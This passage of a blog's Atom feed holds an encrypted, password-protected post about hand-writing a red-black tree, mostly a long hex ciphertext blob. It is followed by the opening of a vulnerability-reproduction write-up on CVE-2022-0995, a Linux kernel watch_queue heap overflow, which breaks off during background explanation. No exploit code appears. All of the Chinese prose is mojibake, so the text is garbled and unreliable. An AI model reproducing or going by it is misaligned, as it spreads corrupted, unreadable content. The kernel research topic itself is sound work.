a006e63a00be1cca2bf4de5835b92b2dd8d7a3ab1363e9020996d67102e3a63b8314748fae74e95a39ef243ffc78bc9a421d9f085e3801e46eed4e98151d426484e2cd4e59fdc2c6af8cb4ed98a22cb47f33f8c90b6c4af49921c1ad04bd4b16aaf1ceb26d071e737444decd4d5f55bd64ab408571dce64b2145170ec03743a38a3e15ab880ecc6ccb47960598a9b1e7eb06df66f9a39bad08093f7ae4dc1ac9ae9f05ba92e51b67fcc8d017376a28a5f75490c312ee0e75c6b3c772f843dd5eaf43fd9d5a8707da6aa82cfc0fa8a8e1eee58223d07ca71f8cdee8d7e060083fa1aefe2f2cae206c7df69768bb53e4f8481cb0678f69b65b607fe441bfa4c218686230c69d4045ada3a2a14746a0506843776e0c47f60906c95d97f353fec88029430da66dba8037422ed00f5deb9faac8adb486b1d9ee8b0ae04575aaafa3a5d73e48037f041dc765464cd7c449c03a0e0499e2f4000edb2236de163466a4fcdd6ba575af998fa4d7c814f4996deb941db1330cadfc2ef33a17a23038f09419a01614ae5aae917c0bf8f3def7d5d4791ec6abc32da8eab134aea2cd3f83f97124ca311d3035cc6ef41f6e7a0adb34eedef91f7f4423372c403ddc0a2686b473ead8ca6e29495953546ba4be434a02597c42c6d2e4e5697e27701ffef032f7b54d71e0785cc0c21a8c9515b20dce725d0460a415730219ad3595f20d177f1d93e258c263212c512729a345d7979a6a741dfcd743fdc67f0fc4a1f56789b065ebc537f69661e4c58d00bfbfdda49479d6aba3ee76eeb32cf0a1c2e0b0d3990cfebf3c6e3a71d1c17e5cfa0e8b3185a5d5aeea812a4fc8b65d88e1ed335a2779d3d7900fdd17e21e9842ad4d72aeb7f8403ffcb41e47b00ea69c225c892b12306ebcfbe1e0cb49c8298142a81d4fb98c8fa2cb270099356949388f2f0df0d14e9e78de5733082fddd31f4099a878cdaadb76a0af1155c751614384cb5df5ec64a4e395b70ecb830834a0bbde0d15e47b3317fea58f4d45671676c4fef2e74dc79834d51b3bcabf71e300366bd82c1aebb56665f1509c5f1fad048c9f4df8adbd2f608a49feeebd08efc4709d7b643507e04ba38b9808b02927ad7f8381a0e3d714fce1c4e18bfac2b5ee8f3d47cf1c724b1bbe596ac83573a036e3a693bb2207884da5aaf3155da7515a9b0e755a38664e5be1678b8eb789ce35dec6c251d4cc64f491a1b1aeeab94a899a150079eceeb1189b46d33bd41e2e73574b9a1d2286dc773ca608733b101a363513c9fc11dad04d3d39f6122cea5974cac5d5a7981cd8aca8b958735ad1be19de7f130a3e6dceacf36bd3d22022a1d73d867326243c87c45d590984bf7f7e2859dcab4b4d8f56cef02c9d31f63e7496dc2f9fc0fd8eb042ba9bb5d17473db9eda7eb233dc43e3304f3e55e455eff47a8be97b7874969b88a4475caf76e448f2cd0a9447bb7922182e7478ccb8b36dba8d36ef66cb24d83afcdd1809417e44bbd99a30f5a72bb9355ca2403c3df2114ccb2548dd45d3737f7fd0a14e5c1629184683bd8827e4c5edff36cde9c887e68b8cf8b2e43c69333f0cedf9b6d87214398c8b300baeea8a05b0f872c6282e44375eaf80f35fcab4a6212a259153b184abe05ba5a1782fb5e2219fd5fb32b04321f6e0ed926514260927f57b5084e98f557baaebc6a51efed708fa4a14c9b47caf0b0f211c86b983f8e2778fa9a086e18b8f1045fc6ee52acf877a7a93891d089ba09794b93fce58813b5c0cc56b490e45e3fdce330cee2685a79effe6cc11ecb83a5d413f4aa7989596404f0eef6a764a0137387916534fcc8fb999cbdee9bdb0adce7be533f47fded70e9eccca233533f2ab44ebe6913ada66d4b8b75094b5f7325367032a72272dd396939233659e2d04a2e76d9e891ba124ce12824295feee137e0b02e58b3090d2a821ce086c919f83d993ca3293b2808bccb3a6f6b6c5e960ec772fdcbe47cae031bebc0a558c5b25e0ffcbcbd2c6c007565389addf1edccca3d95127c85c745c9618386822edb9d236368291a3e530128b9f351c7d204575477c4e98d914322c07a7a5d431e4a8d0c6bba30c50f1f462f18094561901db61d116805c18e348eae3eda416d77f89109c7e2e67bccd494aaaf962d16cfdc86e3eaaac9684f9a44995cc969399a5fbe7628f93b46a328b751692bc77536a9b4d07decb6da6c0846a7445fea2833f1948fdb9f2b1a4860daa809e14f31bb5788b4bf568db67f244bfe214ea0f11497a2e3bdfbb195727e1af4b9422d81103f1bf25bc1c3dc46a6e016ad7b462e29958f1be15eaba8956de1cd202daa19505e9517ae0bc992bd9f6f4834c294e7185f282fe6133b09b9cb8810d32b183f3577873f0ded53dbb9335bc484cbb4cdb3a79b891db1ee0924bfb80629cff6c5b71c6eb3bd4069cd896cf6ec19200b45fd8f85f1b10c06b01b8d66a6bae82302166cd88ed5c8090bb148041c4cafedaaf637fabdde0459c71999d6efeb706b02e9f9787359b57964fca85d7eaaa532ac9cac71a4e5544893f97e11ab00e45009bdb52022170f3680d5eab9c84ef4ec44640c3e3e8ee5098f81a25d40e0663c04034f01c297048b9a00bb1f93ad92ff3a735ddf23f7cc7a4e8f1e1a275097287aa665e4c238a7e339b023d4ccf300aafff02fca993889c4ff2b5cc9049e7d49b8c9212ff141d2a518ee560af6baca3603724d29f348f1ec9a0005f0e60b88b7f3ba7398910f53c69aac8aca9967ce8cbb194f8527a78ef95632ccd395d831d1a985323146c3700694d8ae461fc9b09c57640522c631680e6cb4e7385d02ea1b5cce79cd337b29f7aabb1ef42819ef0750b0b47a646891e8a68c6d1a2a7d426fc2d286b8d4a81c7b87d8fb36afcc83f02e06e1914522fd15fa847fe8bfbe07e620ebebf5b725493826cc77ed15c90e988bf8b586d7ee301e2046e2386727c5f91ccd196d502d3888b19503dd060ca9ba126f53e18b69e21aa97a50459d04a08397417a3dc02c92976709ec3cd7197774482c948b766fb25a48c629a03db8b6aeb752cbbb492ac31238e419f09989dd49dcc435da50a0966a454567d8d518c7dfd954281974fdb9b8117b55c4e00a5b3ce1e036d4b5bb800568368718cb340053cf41f60a127207d60d224244c17921e59dbddffaa1fc0af4ae87c8df58544da5589940b382d68c96baec164b7c2479c0424253f37640f5f04300a29fc17fd526665c9310e7f8f8dae3e16ae7dada52c8b633be28fcf71ec9c46680f5015ce7228b9d9aad2721fed6614b0d2da40c9bdcfb04cbd766796e7be3f790a11d7ab41c3ef0c892ad69dafb4ecd2b2801ed0194aa80c896db1d2185d3dac7f39fcbe221f937eb4884c96b804372734dfc0c7d3f9c60f836325c12b956800633438283147f86dbecf2acf187556ea9a9dadb3228dba8363eb2ff02797357034e2a5789d632cac11399c0c92af0b63e83061ad4bd85bd96222021b950f848f00e59425165d0cb9e2838cfbb738d351e7fb4a7d8b57b8d2c4f6ebaa001b6bbfa260b7f89766afa80d87be57f67875ae3304274e624af1e9ec4e42addc1cdf15fb0d13ddeeb706e91ae72f0615fa4ed05410e29e4fa7b16b40f6da4140cf454ff203b67b9a3c867b32814b1b11504c98f042dbcc50cf8112536763994582d5cdcc5c05516a6515d20e948620e1866e6e9f5f28faebd77f8aac5ff12e762bfdd7b098ad5ad054e4c11ad42f3b014dfdcb940edba42033d908f4ad874bcc75101cb1b6bdfac7d7c7269632e1b4ddde5a82dfd3f2c7f062372ff90692ec2a16ffc32492d6b591d16517709a12ea368e7dd8919edc9c38664dc6b67e4115fcaaac8e2dd2709c1ce4a5d608bf7ca1bf5ac4e2d3ca20b9d6122cfafaba37bed32a136e74227ed19d6f8f9684ca740e6db6ca0ba8124b0e24915ce8c1ba396f9fc90b2f8b18c287ac9f1e3b90524d554e905e3587baad6bd234665217c986641a7523c3110f0942b7c0e9fae9601e1f8a51cbe6fcd90ff320a76f7e7fd2746d8fc5c7ad1e05df5efe0821698accee53c7afa608941660d8d1ba682ae969dab3cc515e7796c0c308dff17308ec18ccd1bafd681f32dbf6722a41be07e67d9b01dd087c8b411134408f2b175c4a91646f2860e05e615032e8c42bb46571fe022f16c5031ec665aade699c9e10bd9a4bdb2ab1eebd2a45973e8c089dcc349cd2e08b8f5b4423eeb8eac245430df472d0319b858dbe7499efdf850aa0e627a0a5301011e2c98b4bc1a0586866092309b0802ea12b85a924dc9342dd0ec66ccaede6288be478516094fb86033201ea7a306568a3cacdda7f19f413234793fea22194b8ba9cf706103e43bb901e2f9237b6654c8d9c91e9bf400966dd88b440eb977daef2b6b7db7027fc32508fdd5884b29faa29b2080ba1bc9acd657159c7f1cb155f45a21038adf75f6ed6d0057764ee96519584cab53861ac220ae0392ec6008ab3fb04f412b601e1a2760ab4a680ae3374d57051ae36add393c3143eacb6cbf288c5de364a9ca873c5f7e068508c6000da5b39bcaf2e8438a1bb447730f989b81bc5951181482af380109754a87b14acb7267d893c53b00555f8cb01167535df7b1beb36546bb0a11aaebe93d26ee47bc942fd9b1df1bd8c56a4fbc710f8e9b82f218cf883c5c9f4b70e0ffa1547ddab3a0f60ae66b4d1f5218f0dad04a66913d4d77dbf118eb7b4cfabaeac4829fd06f1f2751d9218f80afdd125fc7e391b080268187873e0e3f6c4d085f01a54b31a09868992a76cc7ac9e24f8006e192dbf7c7959fb669d0296f78f814bd6da8edbc826f8384bda125c7e6f949133aa6e107c2cd6913fead6e0cfdc7a5ff5c502284f419cc6f4dd7bfeee0deeb19e451722c7e946a9a78f5b22b306cae927883c4807f85a0a9cbd41d11633cecb6f2ad8e47514682e2194a110a97fcc0eaa2dfc263154d9ead3734dbf871b97e2fae05c6fc1e4894dc4a997605d35b1d94f17919cdc6310e56519fb3a15c5cc89e2231c02ea03a630e29628c6197ff7b752f3da20f7dd18d66a5c5d9df8545abe0eb2fe5982f8e1bf05f3f14fd3f2d783b3a4f33dd868a3e33b72a47e58e065971ff8d26becc946489a24bdf371f45452703c9bd6c00ce5fd5ac1cb243d87f060985c4b11693914c75e2b26cf7dd44cc92324f7185fdaac3d1a56778ca71a92bb8881d85aa4e8b3fcfdcacedc47c2d7983e36d76786de605a70944a1a017266d2235aa9ab4cb2bfb65576bd293d24927619abd42ee0a885880a3685583db7a595acf83ee81cd8459ec091475310c0258ceddbd6866d61dbb71cfc7536acdfe6b020a0404ddc63ce94f8edf10970d6ee20b0882412d22f4f0e1527c4fc8ceadcc2c0db85eafced033de983a7dcd3cc2f2386c234b0aa088eacb6b034a7da022c9167105c9b23135e2b8b4900f2c4c4edf6adecb0048b410e688933d4c54dc61c1a5cb9e4418f9dd33f8d78d592e44728fb015468274a422f79d6f1157239f61500b65afd377a3f655c8ca7d713c01d6abb6eaa1fd36c20202b89d25baec7b1bc16aee25908e8fd18281f1db17afd511a0209034fd32cc7f2a1aa6495a7f68b27d7b63df60686697af8f3c5263009a8f499e7833231f945c1ffdf51455068d6573e393346ea91c8e3598024ba59cff4087382409a08b3a287e3629b64b7407c67dd1917f8204eb768cf9b77ba094207db6880faade6096103cd13c539bf7462fbc8772bb3f8f87160db42523e1440f957fccd9ccd06004806de7d1a0e040968ea7570eb67c530bbf1f0c8f56e250939b13f68eb9766d02ee9998b710dd8684bafbe54973711c4d1a5ff2b99d7cad5d1b8ffd0a9e0d90cbfde1871a876c8939ea5f98e08bae73a7a820c6963c856bc3fba6d916eda5a0cbcacedd046d11dc68c68056b2104b327e5e04b74221d8835af9c35bfd98366a813301a52387194df5d17470f443fd04374c071c7a8185b02c7477ce54c029e408256d570e23a671fe88cf82225844e95ee9c94ab308447c36194032c1d36528d71460115404b59f9d1f44d7ee81aec4b10f6ecf56702b5ca1e0f5e13a4ae2bd9917044afb0b45881a2bf43bc85bcc78e4c8ef3cbee5d1ed56f810a5a7ed3bb1105ce4c492d1dfe31d8ffc77e7b20b03e307a92af240c5e5bc999cd40229e2a15de68382d2c629a8c4b846e983bb3ba3b57f1b9d749b122fb35ecb4afacf0b89f1efdd0196832c057178159921fb3dc61656ded99f1c19142e007d666e34f90ccd12607c29f774332c0cf596d536bc5d88453436dee7d07a72d06527e291eb75565f472feb5f52a1291e423289162cc7d1321ff222e8a0c14f9be157a40bc139c3a5ee74f6c670c583e3b4ffa28ffe243172f77b7aa931eb8b32d48659cfa304175dc639e92ecafb9296fad6f4686f0d4774db41eed797bd00b90f61559f9e10681f3a7e8b3382e23e2a7f19109504d53512eddc38892a3eb65741da868c69cb19156ec1c43a25883d52b2a74a1810addfde6a438d037a03736d9fbbaef425f37ec565869a08472c161bb8300bdc5f4d75fb644811c71bf5cf25047cede47399686db72e0fe8967e36a336b83c7197ef42131354ccd876ad9b0e99f5bb02aace1087b38bb6c3441ee4f3228805e3a6a73d6a221b4d54fa23b7a90a8a732d4f03a0c884b70303670ed91d2a34736310ba2b3d328742be634d093d1c6db7e3c9e4f9850fb260a0a1e59d626d2dc2fe912c7b26bb5528a56f9a61ee049c748116f79cd6733700d1864a88468576757f282ded3882043544b4cbea7bbe0cb1372241440484ddd605f3780defd275251d14d84c660c1fdf4db1b7470e795415005619a6a9e1000312e9873afdbc1bcffcbec524f973b0aa75588a984d2ee9ad6eec32674d9b71b2c0c748c017c4118e4c06ccb64e6b86d6af94ba3a74f4c76add280f67559e23606f2bae38653585d2f39f49d63297a16a9a8fcc1e1807eefbc52b99d687d18c1a57cc650926a0341b86dd2800e86d2b8cf47b69bc5451d3a697ed2bd1c1f2867c5a625fbf4951b62b24ef5b2c6997ae702c2b44d2ad70ce3186835d0c4ba9699fa5047b658893424f5238531a83b6241f0e8da891af26ed57c1cfd7b884cadfb1888a6f46945902df36e740d2c9b64a13e108c971cee7b801367f75324edfa97c8ba3561738bd6e74f389f009ca62079394684fca951e599f65a584d045af600d8bc4728c0d1ba8d3c76236bda3c8c129460d21cfbd2e12886bcfb8982f96c41466eb8c2c8d11b623a455e4822dc37598421c5fdf9c4a90916d05a2570a52b405791072d733ba960d4cf4597d9a35986f83903595f5baf5012dff9f2470f12cf7aa63fba2efd1357a5d7b941933f7d10485355c11c89c3779e947280370ee9b52736a5c0166d8fab8d432c8184a4e95c2745b3c49c313cb1eba7d516a2516db67b1ccd41a1d33e3ca1b67ac7fa20e64314664ded417af45847c88e79b0318aa155c2ebd15049ae54da0a55d5440ac4a9f512756074ab40b4614c97a46cf3fa49ad67991ea38abe0cc7fb68a50d1f26e69bb78621beba785cd5491dde94283f0576f5505e74a556267cebc798be87b2380786f2f814e156b9288d2452749367c96d3a2ceb1ad16b29513d5177bd39071b64a2209310b0beccd90769eafebf188dc1f8aeb93b5e3c8a80dcb4363505bec9e71622e44495e1cd48de0efed253adbdbb030932581c08bd365d07cdc7b00dca44a7e50d6883e98b08bab5d573de33e5af6ddd5bfe31afcddbd9778e2ef8bba4c463ede817f484d743b65e48bb70b0e69ce1c00948770edf4ecae5f4b899f7153825dd1e0b90549b8cb2602d93c944357926a81f6d5a9fe5cf1527e793c49bcf62db611114a6f57fb98825a6e7c3232e32882ad0864b83216b8f709ed85e649f52bef5a0a9bda658278bb8c95afbc61aaa7bebacf28a2fa6ba43dfb833b641443c995f482faf91579b8fa607c3c61270197bed73e78592005f74cd971da6c4e2ea88d8b93f0b64cbd063b9688551f9bce23f3bf4b44d7435dd0217c63aa89eebe4bf463b7cd7cd010d91022bcc4de6cfee0d6f85579143ab520982358253eee85055baa778d40f5946fa4713732f000f562e4243c4c0134de21d31a50b931a3eaf925f9c9a421d16023c322bcce2d521326d91ee7385d105ac1fbab8c3cc8f8582a94e17a99d05d7b9c36f0c2f03f2fb1e1505c2043c41f3738db77934e2a2a9f12553fd73af2504717770fb15f72768fc966e1b132ed8de95f9661fe39f102fe01785aafbe6e23b2fd5ba095be38758f6a6efbf81eaba6185ad243b545b0b7886b257bf39a334791e31995d4ecb57c1de07a5c8d046d9a000de3a9a5c6201d7a324fa0108fd6581ecd233024e82d4bb78620739ca2ea2aa37db8204d629598b0ff9ed18c033ceabf2affd60bcd8d5dff6d2538b7913ceaac68c6c69ac3bd1cf2ef9a39023ef6156c6282dc2803a68d15b3ed7cea92b4d024be3bfd4e637c14a34d0ba44b9226bab85a1967ed856648d2fea3ab8b73afeef329f97fc447a1420fa14f606ab55dbb2e719af02a1ca826d90e4072723e68d6979f33b4d253b777acaae4f8c15521557cb8d008fa3258a3a0fa35396b3b98783a7746333977178098e756db76108b550b25c17f2a7249d54b9b1c1cc0985d693d5c0b87a18b1e089732a1ffe3d505e74c5b702e0552ed3805ed15c8bb504e196ac5024436be3198b658375d77597a85efa8b3a167849e70422fda46e069f5301749c082454c66b378a5b363c1f980a90c32ddb52d848929aa2fb74c4d7bed0d8d6ced72d181d1be89e61a9aefdc260d900fd5e435b09804fc54c5f20d0d829f86652c855390a4d3bd164d47833af0371d256e056694ed492587403f818f16ed5e7dc594decaae9a54c87e75dc6fc74cc8d724ca1a18715b9629353e5bcfbe9c5c794a4cfcfcc897acdb96bbdbff01e552445587279d76b2eab53a4909178ab1decf293b479ca4965c21c6847fe06fc55ff6416a37932d271c121daedc3af24ad5debfadbd06dc90374c7915e9e9a2f63c0a6357f4152b92c81739569e9cfc9abe3721f39db1b65c7d5cde3fbcdd6f02616bfccc7dae54ae7d71b2258fb009a8735e28ef5b4490488029a6e054c960f7a5dcd91cc0a1d76726ac343668055bc100cb7336c4ab4803aef89105e7f59208bd2c50fb9ed93935dfe63c889a175c4a45eca224d089e3dd502c5649ec8015fe21677c005ac82eae3fffe1425cd20a2beb23e12f3d68aa2f4ae2d4bfd6d6acdf435975d597613e67c9c70464c52fab19122d509be824eb2b62ea132e74ba77295cd0b743c32e0ece12d218611aa886fb066249b45308db86596607632037f2798fbc38bb607fd9ced3fffce31d34a679777c84d3089a0223fdc8cbfe035e177b17bf58a03d08347334fbaa8ecea987ce5f8bad80a38fc2a93ee449edbbb1ed1f3f005e73a46bcc322eb60dad02836c4745fecb738378e13f26522c43fedb11e7e5a6acd17f1e125dcd7afdbbeccc8cc20408bda67429dc25f9dbb96c9b217a5c1958922caa9ddd6f5107a8e58ff90c50be07370e3fe0b6b9f5dc30d11dd50ff5dba167bed204877455bf9781368fc00c12a32e822b0fb4a8174ea223fd9ec32e9083ccaeb246f88e6cce12db8c854597d79042915d2204a52a24f69c381b3ff4ea7f0aa2a1dab9defe2c6bb8115752e40a9f4cbcb41bd665c9ec47d672fcdf985695d052108bbfa3aac435fa1cc68c7a473813c501399ba789bc06dd6197083cfb127673a09cd84d7cba821ecf78b0e22729841dcd6fb47ef2dbdc3f3c29dffd4b9ea2cbfaaac9376349d613d4cd20d2e0e0ca2f287b5e31fa22bcf4a63f0107e1675310b16c94456233342eb33987b36debe87f139aa05918ea0fc3c481479cc2685b305154d88c78ed3b0bfeb21256ed60d425372ee86b8d7863d246e8f7a3d694c83a1d10d9943555f1d079647e959d847dec820b49ccacc2f3088aef3de6d08496ad4c91954f226a781db9d1066222722fb01ca3b694cd8e9b6e57bbaf6fa06b76dc07499622532de9e883fa9cb61b13bdf67f1722f6cd28ac8b77bbc679a747aee57934cd266e52c08b103e42a53f2f2173965f04d9a7c099d7f10e3d5fc5c33d4ff207cdb19c234443676897e714a71faf6f4239bacee6d330d054b7d6a437cfef87595652c59a41be848722c49427a8b3009e9de8556a47bb210a8c603bcc921eb09e1bccdd5e43ee75f1074e0d6ace6452da6692e3d9f6da8be969d1f7ae1d755dac1bec3db93f0864848c332437132c64e0d054afbe4cc612ed242947775cae64fa21e15a0b8dbaf018c6c2f266bef10d83cd3a7544ecc2c6d50aaa3bb3bc799d682fd1a1eb0bd2eb43e966584291cea29812805805679a2dfb6a1976b7389f8234c28e225a51246f6fb711a2778b6866156ee61ff0bcb546f599c6ca6732d543640420cb2fe34be2664dfc30c520d861a7d6d66b98eadfa5dc4d1d178ec00fa74b520ebd4002f325a8f015eee98b5ad48cfc3878fd71472ec5264268800521fb580e14db5ae0df7759497a4299454a5a5228d1d6277d5fc0c81ac78c18ce342d21d5278c378eb91ee109edc97430e68020b3faacac2545248b65825df63dec0b9f898f0b82bcaa5b20350b85c3d0da217ec37e1cf623b77da7a75ee93c46e023deb8fa0ec8d32d7e8c2c015ee164e09ecbc7a84608d7426ac3308015cb096664ce1703d2faaaa4e375230853ec7384355f25676497e4294bd216f26750112db4f3dad96639941008e3066cffc3c7711b5dc935c1975c5a3aff36aefd9b112218dcdd17187108b1c6aa2499e1d1b5f5958a0ca60bd7c6cfb1f756d8641f570ff31abfd568507421d0c02cf623af0cd8d841a2e9a302e35c4d1cc3d22bc7465b70916f69c90bd2f8f0dabd4ec7757aad32c7806714c25ed32c10e81c5dea456069bf053db029e93b5b18e09cef7bff8bcd7ff02d272727b02c8818793ae19069bf7ef34a63b312083011c46a69eeba371e0a9309a78869b3a98002538ae9c39be8ca173678c1d691bd783e8a7313ec211c05b8db2bf9c20d719c0fa2a6ae48ce14deca7f7c052432b653d6cc32e655d612d38c66cf90eb74010b5d387bb2f943a1fe497d19495114182c128afffb1ae3898a7f2defa961d341aa92acf989f41a39b2901e713863fee607a80edb9001dfdebdc3af187519df33a027935e7335018ac37da2c2809daa3c8a4e32a2944fe30ed248ecf6014e88a7db58f09b02c722a136386da926eab17bbcf56a48be07b5891b6b9f900760c3916ffb1252a8130fc91958a6f2a6a229e53a75e459d478c1a8d7eeec3f8cb8a65eb9bee3f593fa082ed2554a85164ab56abe5becc68bf89a3dd367803e7aba0fe1f1053f1c4e338b04a15f7bb64011cc8a380bed98d415a17e6e732bed8872f85906feb5c2d4394189a7195ba0231ed3ef8695420b33fe83ec567f15adbfc4ad95bcd66a48d93ecc9860443824916c55a6bc809b62e1f4d986cae85c6faa290fc3a54be8028df1a4f59caa20e418ac7faa23fa15e9924177e231656b682057743dd74454a8467580686a13f450d7f9609fff564662d16ec18bcea9ec087a3700a3a4f67d5206899e0bcb20971378cccc864c175090974b0fbe4ab33fe12959f3ce2cb8c1a419803f9346e0d24444a2c35f595193a696911e7140540024f07b109139628cac0672aac0cc9a4b3bd4b64857dabcf0e52b579a0735b8e46a7aa0adc735487e1104bbfdd73b951f52ff0ce35e5f9e5ae770d14e0ffcd357ecd78c6932a0ad513bd6126c9b49996340eb0376da88a4561b3388f8821b73fa95f9f5be2bc5c42ab4ed9cf23c19800b09d74d8df9435828b9039ab7b9880b53bd31a38cefcdc2cd7bdabea9326ba9ca0457937c0dc61a7f69d9c20808ab4e86b403fa194e0f3eafdbcc2c3f088a676e1363b4a9409c5e58cb83314863487e5633ac3f22714c451af6cecf21d819d598baee74c9e13bbbedb50ea972f2435aa5169912ecf0332624a9df6a94688aade9ffc3239cb27f2c935473b6e51d954cce341b0788f76e29f3e268b4c7d9e60545e710c7224b27e4e5eb5d079e0dac35aa5135f88a58d10edf80575fc47ee1ae7ce264088f62f5e794e0cf82e48ec23b77f9f4faa80c3cc1ca70d7729b25f9d57b1d98d228e75027e1a1abbe2445a075d056682e06e6aeb1f0c45cb50b4b40d07128009a84559395d2720d0b8b5fde86fe9afec0dac5d073049d0d215b6f789680e6ede7ef652f8826a48bc6a0358fbb1283048509186d7e4a73c0983295d60a15bfebcf0717abc22f4721d9eff870509681a993a7264a8e5a7dd3f30ec432aba761609f441ee8a1f76df75fb262f5904c74d20548651e9b981cade96e4568449fc014598fa6e14829b481f3ba73c3a92044b816315372fad51d496b015a4af83e9e84ce41e83bb83103b2a121e540884367070cf9e2e1928bac3432f5eb4bd1cac115e20481f913e7f5c8340d5644aab3a3755d9d8bd0256bc8760d4d90a97decca5324ee1a6ed71d8adca23ee1b66bf6eac6f3cdfc456632421836004668c392769382480bbd225ab1d89df3a8425a09b47826a7178246c91e63f52ee544215c07a24635a9b3e12353351b6a30f378dd8d565065b1159b9f0128f759cfc309209b0533434a3cfdd86c7e7289b493b2ca76e8b141c991ab9b27f9d78137f08b2fb3abbe432224768d8d9c5faab2497b9c29adb38fb9d48ed15d6b84e81aa82fe815e36e56b425ca12ce22f5e035723555d2ed285c234712852ae3e885d458bf01d6e2efaeb9e36a27d2333eda3dfbf8213ac41514afdfb5a53330b731700cd0e68c3137dbd1010d8dd1921f27e77603a6dfa74f88d5cd454b2579e070e7865b051e11b5d12199eec578e4fe8b6a37104a49396ceb07a4a0dace7217ae88cd3ee9cc25858b8eef7f54f23f411a673a6f26c81b821dc02821ed702f26ed2af4b534437f1afcb9dc639c5f21ef6d5e5d4bf70cc3b3b477acbadacff3d98ba649d6eb9bd82ba8c45d2c1b8ac9dcc7445365363d728fa6af17b45ab62dde44fc20bff9791d639d96d5c425c84846a640b4fb09f6c5ce61ee1e842186924dd650098d743fdbc7a70605f65c1c68350cf8f36510f29fb926835454f0950510b97900a5a48372369a4fa1fe6bc81923394e237e0c10c2c501352a6afc8d661c0bb1922550ed598f7bef7a69f067061100c535785c7e2c1404f2f64feb0db030f883c5da6922843aa661db39851ff8a03691f4c5b5050cd1830210c111fad52454696857ba0aaff7fddf04a2608fd3929775718eb4ce189e637e0983369d87fd5153545240db47297b8a52f86b68869a992404557c7684b62901af875f78303e43322a0a80dc9f47de7a20efdf8f05d43086bf429f0a6c5c84ab871ce95663e3cdfd29921fa5ecb16034300ba684be50aa276e1a2a726e19ee3a6ab9ec32d96922aa6865f0aa1fea5d09f27ab978266089403291ea456562abed9355343a20378bb38c1bb786974ac0e79b1d50ba2ea4f1e1e6a5617f1d56242a022cfbd6a0e24dd2b2bc359cf3b136fe421dff7213fc12a19305ee64600fd2f946420fc22a767cda0bbd5d8636ae5dce2202b51da840e97a90242886d03b237a8eeff63e0638f8e35700cbb81d2736402ad35404e722a2d72348bcfca8b1e47458576fa448e15d64a7de597b9ff855decba5db53ba0e0fb86b89630f196617d07f6ec0cd3ba6fa1cf704fb6f0160cb846b4ceb7ad25a59f1ece62a63c3a275c4c6c432e96a4e6105243b5cf06a76a25fccb095ab1332e793cfe5ee5969f3fc</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">é¢è¯•å®˜ï¼šå¬è¯´ä½ ç®—æ³•è¿˜è¡Œï¼Œæ¥ç»™ğŸ‘´ç®€å•æ‰‹å†™ä¸ªçº¢é»‘æ ‘å°±è®©ä½ è¿‡äº†</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">é¢è¯•å®˜ï¼šå¬è¯´ä½ ç®—æ³•è¿˜è¡Œï¼Œæ¥ç»™ğŸ‘´ç®€å•æ‰‹å†™ä¸ªçº¢é»‘æ ‘å°±è®©ä½ è¿‡äº†</summary>
    
    
    
    <category term="ALGORITHM" scheme="http://blog.arttnba3.cn/categories/ALGORITHM/"/>
    
    
    <category term="C&amp;C++" scheme="http://blog.arttnba3.cn/tags/C-C/"/>
    
    <category term="Algorithm" scheme="http://blog.arttnba3.cn/tags/Algorithm/"/>
    
    <category term="Tree" scheme="http://blog.arttnba3.cn/tags/Tree/"/>
    
    <category term="Binary Search Tree" scheme="http://blog.arttnba3.cn/tags/Binary-Search-Tree/"/>
    
    <category term="AVL Tree" scheme="http://blog.arttnba3.cn/tags/AVL-Tree/"/>
    
    <category term="Red-Black Tree" scheme="http://blog.arttnba3.cn/tags/Red-Black-Tree/"/>
    
  </entry>
  
  <entry>
    <title>ã€CVE.0x08ã€‘CVE-2022-0995 æ¼æ´å¤ç°åŠç®€è¦åˆ†æ</title>
    <link href="http://blog.arttnba3.cn/2022/04/06/CVE-0X08-CVE-2022-0995/"/>
    <id>http://blog.arttnba3.cn/2022/04/06/CVE-0X08-CVE-2022-0995/</id>
    <published>2022-04-06T04:24:09.000Z</published>
    <updated>2022-04-06T04:40:16.000Z</updated>
    
    <content type="html"><![CDATA[<p>æˆ‘åœ¨çœ‹ç€ä½ ğŸ‘_ğŸ‘</p><span id="more"></span><h1>0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p>CVE-2022-0995 æ˜¯è¿‘æ—¥çˆ†å‡ºæ¥çš„ä¸€ä¸ªå­˜åœ¨äº <em>è§‚å¯Ÿé˜Ÿåˆ—äº‹ä»¶é€šçŸ¥å­ç³»ç»Ÿ</em>ï¼ˆwatch_queue event notification subsystemï¼‰ä¸­çš„ä¸€ä¸ªå †æº¢å‡ºæ¼æ´ï¼Œè¯¥æ¼æ´è‡ªå†…æ ¸ç‰ˆæœ¬ <code>5.8</code> ä¸­ä¼´éšç€ watch queue subsystem å¼•å…¥ï¼Œåœ¨ <code>5.17-rc7</code> ç‰ˆæœ¬ä¸­è¢«ä¿®å¤</p><p>ä¸è¿‡è™½ç„¶è·å¾—äº† <code>7.1</code> çš„ CVSS è¯„åˆ†ï¼Œä½†è¿™ä¸ªæ¼æ´ä¼¼ä¹å¹¶æ²¡æœ‰ä»€ä¹ˆçƒ­åº¦ï¼Œä¸è¿‡åœ¨ç¬”è€…çœ‹æ¥è¿™ä»ç„¶æ˜¯ä¸€ä¸ªå“ç›¸ä¸é”™çš„æ¼æ´</p><p>åœ¨å¼€å§‹ä¹‹å‰æˆ‘ä»¬å…ˆæ¥è¡¥å……ä¸€äº›åŸºç¡€çŸ¥è¯†</p><h2 id="General-notification-mechanism"><em>General notification mechanism</em></h2><blockquote><p>å‚è§<a href="https://www.kernel.org/doc/html/latest/watch_queue.html">https://www.kernel.org/doc/html/latest/watch_queue.html</a></p></blockquote><p><em>é€šç”¨é€šçŸ¥æœºåˆ¶</em> æ˜¯å»ºç«‹åœ¨æ ‡å‡†ç®¡é“é©±åŠ¨ä¹‹ä¸Šçš„ï¼Œå…¶å¯ä»¥æœ‰æ•ˆåœ°å°†æ¥è‡ªå†…æ ¸çš„é€šçŸ¥æ¶ˆæ¯æ‹¼æ¥åˆ°ç”¨æˆ·æ‰“å¼€çš„ç®¡é“ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>CONFIG_WATCH_QUEUE</code> 